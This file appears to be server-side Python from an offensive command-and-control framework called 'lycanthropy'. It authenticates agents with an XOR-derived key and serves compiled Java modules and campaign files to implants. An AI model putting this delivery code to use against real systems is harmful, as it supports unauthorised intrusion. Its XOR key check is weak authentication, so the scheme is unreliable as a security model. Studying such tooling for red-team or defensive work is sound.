import hashlib
import lycanthropy.sql.interface
import lycanthropy.auth.cookie
import base64
import os
import json

def derive(epoch,acid):

    raw = lycanthropy.sql.interface.filterBuild({'acid': acid})[0]
    derivedBytes = ''.join(
        chr(
            ord(a) ^ ord(b)
        ) for a,b in zip(
            str(
                epoch
            ),
            raw['distKey']
        )
    ).encode('utf-8')
    return base64.b64encode(derivedBytes).decode('utf-8')

def verify(acid,key):
    for skewer in lycanthropy.auth.cookie.skew():
        if derive(skewer,acid) == key:
            return True
    return False


def getManifest():
    with open('../etc/dist/manifest.json') as fileHandle:
        return json.load(fileHandle)

def getBytes(file):
    fileHandle = open(file,'rb')
    fileData = fileHandle.read()
    fileHandle.close()
    return base64.b64encode(fileData).decode('utf-8')

def getHash(file):
    fileHandle = open(file,'rb')
    hasher = hashlib.sha256()
    hasher.update(fileHandle.read())
    fileHandle.close()
    return hasher.hexdigest()

def pkgSearch(acid,pkgID):
    #pulls package from server to agent
    try:
        campaign = lycanthropy.sql.interface.filterBuild({'acid': acid})[0]['campaign']
    except:
        return {'errorCode':'not found'}
    pkgManifest = getManifest()
    for package in pkgManifest:
        if pkgManifest[package]['id'] == pkgID:
            return {
                'fileName':'{}.class'.format(package),
                'fileObj':getBytes('campaign/{}/dist/agent/{}.class'.format(campaign,package)),
                'fileHash':getHash('campaign/{}/dist/agent/{}.class'.format(campaign,package))
            }

    return {'errorCode':'not found'}

def fileSearch(acid,fileName):
    #pulls file from server to agent
    try:
        campaign = lycanthropy.sql.interface.filterBuild({'acid': acid})[0]['campaign']
    except:
        return {'errorCode':'not found'}
    if fileName in os.listdir('campaign/{}/docroot'.format(campaign)):
        return {
            'fileName':fileName,
            'fileObj':getBytes('campaign/{}/docroot/{}'.format(campaign,fileName))
        }